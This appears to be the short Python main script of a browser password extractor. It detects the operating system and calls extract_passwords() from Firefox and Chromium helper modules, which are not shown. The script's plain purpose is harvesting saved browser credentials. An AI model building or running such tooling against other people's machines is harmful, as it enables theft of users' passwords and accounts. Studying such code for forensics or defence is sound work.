import sys
import chromium_utils as chrome
import firefox_utils as firefox

# Vérification de l'OS
IS_WINDOWS = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")
IS_MAC = sys.platform.startswith("darwin")

if __name__ == "__main__":
    firefox.extract_passwords()
    chrome.extract_passwords()